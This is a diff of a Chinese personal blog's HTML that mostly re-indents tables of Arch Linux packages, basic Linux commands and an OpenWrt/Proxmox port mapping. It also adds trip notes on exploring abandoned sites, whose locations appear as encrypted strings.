-          &lt;td&gt;包含最核心的工具，不含内核&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;base-devel&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;开发工具包&lt;/td&gt;
-          &lt;td&gt;包含 &lt;code&gt;gcc&lt;/code&gt;, &lt;code&gt;make&lt;/code&gt; 等，AUR 编译必装&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;linux&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Linux 内核&lt;/td&gt;
-          &lt;td&gt;主线内核&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;linux-zen&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Linux 内核&lt;/td&gt;
-          &lt;td&gt;偏向性能优化&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;linux-lts&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Linux 内核&lt;/td&gt;
-          &lt;td&gt;提供长期支持版本&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;linux-firmware&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;硬件固件驱动&lt;/td&gt;
-          &lt;td&gt;包含显卡、声卡、网卡等驱动&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;nano / vim&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;文本编辑器&lt;/td&gt;
-          &lt;td&gt;进入新系统后修改配置文件的唯一手段&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;networkmanager&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;网络管理服务&lt;/td&gt;
-          &lt;td&gt;自动处理 WiFi 和有线连接&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;btrfs-progs&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Btrfs 文件系统工具&lt;/td&gt;
-          &lt;td&gt;Btrfs必装的工具&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;intel-ucode&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Intel CPU 微代码更新&lt;/td&gt;
-          &lt;td&gt;提升 CPU 稳定性和安全性（AMD 用户换成 &lt;code&gt;amd-ucode&lt;/code&gt;）&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;ntfs-3g&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;NTFS 读写支持&lt;/td&gt;
-          &lt;td&gt;方便在 Arch 中读写 Windows 资料盘&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;bash-completion&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;命令行自动补全&lt;/td&gt;
-          &lt;td&gt;提高敲命令的效率&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;&lt;strong&gt;名称&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;作用&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;备注&lt;/strong&gt;&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;base&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;系统的最基础组件&lt;/td&gt;
+					&lt;td&gt;包含最核心的工具，不含内核&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;base-devel&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;开发工具包&lt;/td&gt;
+					&lt;td&gt;包含 &lt;code&gt;gcc&lt;/code&gt;, &lt;code&gt;make&lt;/code&gt; 等，AUR 编译必装&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;linux&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;Linux 内核&lt;/td&gt;
+					&lt;td&gt;主线内核&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;linux-zen&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;Linux 内核&lt;/td&gt;
+					&lt;td&gt;偏向性能优化&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;linux-lts&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;Linux 内核&lt;/td&gt;
+					&lt;td&gt;提供长期支持版本&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;linux-firmware&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;硬件固件驱动&lt;/td&gt;
+					&lt;td&gt;包含显卡、声卡、网卡等驱动&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;nano / vim&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;文本编辑器&lt;/td&gt;
+					&lt;td&gt;进入新系统后修改配置文件的唯一手段&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;networkmanager&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;网络管理服务&lt;/td&gt;
+					&lt;td&gt;自动处理 WiFi 和有线连接&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;btrfs-progs&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;Btrfs 文件系统工具&lt;/td&gt;
+					&lt;td&gt;Btrfs必装的工具&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;intel-ucode&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;Intel CPU 微代码更新&lt;/td&gt;
+					&lt;td&gt;提升 CPU 稳定性和安全性（AMD 用户换成 &lt;code&gt;amd-ucode&lt;/code&gt;）&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;ntfs-3g&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;NTFS 读写支持&lt;/td&gt;
+					&lt;td&gt;方便在 Arch 中读写 Windows 资料盘&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;bash-completion&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;命令行自动补全&lt;/td&gt;
+					&lt;td&gt;提高敲命令的效率&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;blockquote&gt;
 &lt;p&gt;linux内核可以安装多个，如果某一个内核崩溃可以随时切换&lt;/p&gt;
@@ -11825,94 +12392,94 @@
 &lt;img src=&#34;48.jpg&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h2 id=&#34;linux常用命令&#34;&gt;Linux常用命令
 &lt;/h2&gt;&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;&lt;strong&gt;常用操作与管理&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;系统信息与网络&lt;/strong&gt;&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;文件与目录操作&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;系统信息&lt;/strong&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;ls&lt;/code&gt;：列出目录内容&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;uname -a&lt;/code&gt;：查看系统信息&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;cd 目录&lt;/code&gt;：切换工作目录&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;df -h&lt;/code&gt;：查看磁盘空间&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;pwd&lt;/code&gt;：显示当前路径&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;du -sh 目录&lt;/code&gt;：查看目录占用大小&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;cp 源 目标&lt;/code&gt;：复制/目录&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;lsblk&lt;/code&gt;：查看磁盘和分区&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;mv 源 目标&lt;/code&gt;：移动/重命名&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;文件内容与搜索&lt;/strong&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;rm 文件&lt;/code&gt;：删除文件/目录&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;grep 关键词 文件&lt;/code&gt;：搜索文本内容&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;mkdir 目录名&lt;/code&gt;：创建目录&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;find 路径 条件&lt;/code&gt;：查找文件&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;rmdir 目录名&lt;/code&gt;：删除空目录&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;which 命令&lt;/code&gt;：查找命令路径&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;软件包管理&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;压缩与解压&lt;/strong&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;pacman -S 包名&lt;/code&gt;：安装软件&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;tar -xvf 文件.tar&lt;/code&gt;：解包&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;pacman -Syu&lt;/code&gt;：更新系统&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;tar -cvf 文件.tar&lt;/code&gt;：打包&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;pacman -Rns 包名&lt;/code&gt;：卸载软件&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;gzip 文件&lt;/code&gt;：压缩文件&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;pacman -Ss 关键词&lt;/code&gt;：搜索软件&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;gunzip 文件.gz&lt;/code&gt;：解压&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;进程管理&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;服务管理&lt;/strong&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;ps&lt;/code&gt;：查看进程&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;systemctl status 服务&lt;/code&gt;：查看状态&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;top&lt;/code&gt;：实时查看进程/资源&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;systemctl start 服务&lt;/code&gt;：启动服务&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;kill PID&lt;/code&gt;：结束进程&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;systemctl enable 服务&lt;/code&gt;：开机自启&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;free -h&lt;/code&gt;：查看内存使用&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;网络相关&lt;/strong&gt;&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;code&gt;ip a&lt;/code&gt;：查看网络信息&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;&lt;strong&gt;常用操作与管理&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;系统信息与网络&lt;/strong&gt;&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;文件与目录操作&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;系统信息&lt;/strong&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;ls&lt;/code&gt;：列出目录内容&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;uname -a&lt;/code&gt;：查看系统信息&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;cd 目录&lt;/code&gt;：切换工作目录&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;df -h&lt;/code&gt;：查看磁盘空间&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;pwd&lt;/code&gt;：显示当前路径&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;du -sh 目录&lt;/code&gt;：查看目录占用大小&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;cp 源 目标&lt;/code&gt;：复制/目录&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;lsblk&lt;/code&gt;：查看磁盘和分区&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;mv 源 目标&lt;/code&gt;：移动/重命名&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;文件内容与搜索&lt;/strong&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;rm 文件&lt;/code&gt;：删除文件/目录&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;grep 关键词 文件&lt;/code&gt;：搜索文本内容&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;mkdir 目录名&lt;/code&gt;：创建目录&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;find 路径 条件&lt;/code&gt;：查找文件&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;rmdir 目录名&lt;/code&gt;：删除空目录&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;which 命令&lt;/code&gt;：查找命令路径&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;软件包管理&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;压缩与解压&lt;/strong&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;pacman -S 包名&lt;/code&gt;：安装软件&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;tar -xvf 文件.tar&lt;/code&gt;：解包&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;pacman -Syu&lt;/code&gt;：更新系统&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;tar -cvf 文件.tar&lt;/code&gt;：打包&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;pacman -Rns 包名&lt;/code&gt;：卸载软件&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;gzip 文件&lt;/code&gt;：压缩文件&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;pacman -Ss 关键词&lt;/code&gt;：搜索软件&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;gunzip 文件.gz&lt;/code&gt;：解压&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;进程管理&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;服务管理&lt;/strong&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;ps&lt;/code&gt;：查看进程&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;systemctl status 服务&lt;/code&gt;：查看状态&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;top&lt;/code&gt;：实时查看进程/资源&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;systemctl start 服务&lt;/code&gt;：启动服务&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;kill PID&lt;/code&gt;：结束进程&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;systemctl enable 服务&lt;/code&gt;：开机自启&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;free -h&lt;/code&gt;：查看内存使用&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;网络相关&lt;/strong&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;ip a&lt;/code&gt;：查看网络信息&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h2 id=&#34;参考&#34;&gt;参考
 &lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://wiki.archlinuxcn.org/wiki/%e5%ae%89%e8%a3%85%e6%8c%87%e5%8d%97&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -12534,45 +13101,45 @@ hostname为虚拟局域网给OpenWrt设备分配的IP地址&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：OpenWRT中显示的网口编号不等于物理网口编号，具体编号需要看映射情况，推荐做一个下表来直观显示映射情况&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;OpenWrt 接口&lt;/th&gt;
-          &lt;th&gt;PVE 桥接&lt;/th&gt;
-          &lt;th&gt;PVE 从属端口&lt;/th&gt;
-          &lt;th&gt;物理网口&lt;/th&gt;
-          &lt;th&gt;功能&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;eth0&lt;/td&gt;
-          &lt;td&gt;vmbr0&lt;/td&gt;
-          &lt;td&gt;enp2s0&lt;/td&gt;
-          &lt;td&gt;eth1&lt;/td&gt;
-          &lt;td&gt;PVE 管理、LAN&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;eth1&lt;/td&gt;
-          &lt;td&gt;vmbr1&lt;/td&gt;
-          &lt;td&gt;enp1s0&lt;/td&gt;
-          &lt;td&gt;eth0&lt;/td&gt;
-          &lt;td&gt;WAN&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;eth2&lt;/td&gt;
-          &lt;td&gt;vmbr3&lt;/td&gt;
-          &lt;td&gt;enp3s0&lt;/td&gt;
-          &lt;td&gt;eth2&lt;/td&gt;
-          &lt;td&gt;LAN&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;eth3&lt;/td&gt;
-          &lt;td&gt;vmbr4&lt;/td&gt;
-          &lt;td&gt;enp4s0&lt;/td&gt;
-          &lt;td&gt;eth3&lt;/td&gt;
-          &lt;td&gt;LAN&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;OpenWrt 接口&lt;/th&gt;
+					&lt;th&gt;PVE 桥接&lt;/th&gt;
+					&lt;th&gt;PVE 从属端口&lt;/th&gt;
+					&lt;th&gt;物理网口&lt;/th&gt;
+					&lt;th&gt;功能&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;eth0&lt;/td&gt;
+					&lt;td&gt;vmbr0&lt;/td&gt;
+					&lt;td&gt;enp2s0&lt;/td&gt;
+					&lt;td&gt;eth1&lt;/td&gt;
+					&lt;td&gt;PVE 管理、LAN&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;eth1&lt;/td&gt;
+					&lt;td&gt;vmbr1&lt;/td&gt;
+					&lt;td&gt;enp1s0&lt;/td&gt;
+					&lt;td&gt;eth0&lt;/td&gt;
+					&lt;td&gt;WAN&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;eth2&lt;/td&gt;
+					&lt;td&gt;vmbr3&lt;/td&gt;
+					&lt;td&gt;enp3s0&lt;/td&gt;
+					&lt;td&gt;eth2&lt;/td&gt;
+					&lt;td&gt;LAN&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;eth3&lt;/td&gt;
+					&lt;td&gt;vmbr4&lt;/td&gt;
+					&lt;td&gt;enp4s0&lt;/td&gt;
+					&lt;td&gt;eth3&lt;/td&gt;
+					&lt;td&gt;LAN&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;进入OpenWrt管理界面，&lt;code&gt;network&amp;gt;interfaces&amp;gt;wan&amp;gt;edit&lt;/code&gt;，然后将device改成需要的WAN口，右下角保存&lt;/p&gt;
 &lt;img src=&#34;op2.png&#34; style=&#34;width: 100%;&#34; /&gt;
@@ -12803,14 +13370,14 @@ hostname为虚拟局域网给OpenWrt设备分配的IP地址&lt;/p&gt;
 &lt;h3 id=&#34;装备&#34;&gt;装备
 &lt;/h3&gt;&lt;h4 id=&#34;核心&#34;&gt;核心
 &lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;相机：佳能EOS M2&lt;/li&gt;
+&lt;li&gt;相机：佳能EOS M2、索尼A7C2&lt;/li&gt;
 &lt;li&gt;手机：紧急联系与查资料&lt;/li&gt;
 &lt;li&gt;手电筒：照亮前路&lt;/li&gt;
 &lt;li&gt;轻便的背包：装东西的同时方便行动&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h4 id=&#34;个人防护&#34;&gt;个人防护
 &lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;登山鞋：防止地上的玻璃和钉子扎伤脚&lt;/li&gt;
+&lt;li&gt;运动鞋：爬墙很方便，防护略差，需要小心行动&lt;/li&gt;
 &lt;li&gt;防割手套：处理铁皮等锋利杂物&lt;/li&gt;
 &lt;li&gt;劳保手套：翻墙或爬梯子时保护双手&lt;/li&gt;
 &lt;li&gt;n95口罩：在闻到灰尘/真菌的味道时使用&lt;/li&gt;
@@ -13082,34 +13649,38 @@ hostname为虚拟局域网给OpenWrt设备分配的IP地址&lt;/p&gt;
 &lt;h2 id=&#34;比赛之旅&#34;&gt;比赛之旅
 &lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;时间：&lt;/strong&gt; 25.10.29-30 | &lt;strong&gt;人数：&lt;/strong&gt; 1&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这次是我来崇礼比赛，比完后的空闲时间顺带去的四个地方。&lt;/p&gt;
+&lt;h3 id=&#34;城中飞机&#34;&gt;城中飞机
+&lt;/h3&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;目标：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX19igL7idaPMtTgH50bBncnO5kyIej8gLXAYoe5W6LP95BvFGWmfqfZ6&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;位置：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX1-QoYRjsnrHzYvaAmX3OymgfYkDxRak1fgZGzsV5xspwriv2oqfs41m&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;规模：&lt;/strong&gt; 小 | &lt;strong&gt;难度：&lt;/strong&gt; 大 | &lt;strong&gt;风险：&lt;/strong&gt; 低&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;坐落于公园里的废弃飞机，和&lt;a class=&#34;link&#34; href=&#34;#%e8%b5%b7%e6%ba%90&#34; &gt;起源&lt;/a&gt;类似，无人管理。曾经旁边有棚子，可以顺着棚子爬上机翼，然后进入机舱，可我来的时候棚子已经拆除，周围没有任何落脚点，于是没能进入，拍了些照片就离开了&lt;/p&gt;
+&lt;h3 id=&#34;阈限空间&#34;&gt;阈限空间
+&lt;/h3&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;目标：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX1-vZkG2cTeUwNFbLnbl4laaB02YuaPjg-Q&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;位置：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX1_VA3FvAlgWyTjgzdB6IW2A_QD3um82wO8dkE82al5-oHaVBMPwwV_U&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;规模：&lt;/strong&gt; 极大 | &lt;strong&gt;难度：&lt;/strong&gt; 大 | &lt;strong&gt;风险：&lt;/strong&gt; 高&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;一片厂区，据说无法进入，但我还是去碰了碰运气。到达后顺着边缘走，走着走着就来到一片工地，工地和目的地相连，于是很简单的就进去了，第一个建筑中有一个长廊，左边是窗户，右边是锈蚀的机器，一眼望不到头。向前走一段路，就变成了前后都是无尽的长廊，再加上那天是阴天，外面的光不是很强烈，透过老窗户照进来，将这里变成了一个阈限空间，让我有一种在梦中的感觉。&lt;/p&gt;
+&lt;p&gt;爬窗出来后，到了一片杂草地，旁边的楼里是输送煤炭的管道。出来后就在周围寻找进入主厂区的路，但很遗憾花了很长时间都没有找到。于是我原路返回，在厂区外围绕了一圈，找到一个锁住的大门，和一个路边摆放的水泥管，高度和围墙相当。大门确认没有办法打开或者钻进去，爬上水泥管倒是可以跳进去，但考虑到这里和厂区隔着100米的杂草地，而且不知道该怎么出来，于是还是放弃了&lt;/p&gt;
+&lt;h3 id=&#34;衰落&#34;&gt;衰落
+&lt;/h3&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;目标：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX18Ee4aXDhmKLEeEyLWG9uSGkA_zPuj17L56y4HeW0k2cTASzdeCRQGx&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;位置：&lt;/strong&gt; &lt;code&gt;U2FsdGVkX18eHWfh3_oZAQ-1QNMcF-l625t0Y3gaLC0oCUtyhjGnFyR-Tzlkqb-m&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;规模：&lt;/strong&gt; 中 | &lt;strong&gt;难度：&lt;/strong&gt; 无 | &lt;strong&gt;风险：&lt;/strong&gt; 中&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;4.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;坐车来到一个偏僻小镇，然后来到一处乡村一样的地方，下了公交车后爬了一段坡到达目的地。这里有几栋住宅楼和两栋主楼，由于住宅楼没什么特点就没有进去。第一栋主楼是天窗结构，屋顶全部是玻璃，楼中间是空的，只有四周有走廊和房间，这样的结构导致有一只鸟飞进来只会向上撞玻璃而无法出去，我尝试解救，但失败了，只好作罢，出门的时候在地上见到一只螳螂，才发现我已经很多年没见过螳螂了。&lt;/p&gt;
+&lt;p&gt;第二栋楼是活动室，但貌似有人曾在这里拍戏，地上有很多垃圾，墙面也很脏，让人不爽。只有走廊稍稍有点特点，其他地方很普通。到了顶楼，昏暗的环境下是一座窗边的雕像，再往另一边走，是某个大佬的涂鸦。这里是楼正面尖顶的房间，整个房间的墙上都遍布涂鸦，大概是这个废墟最独特的地方&lt;/p&gt;
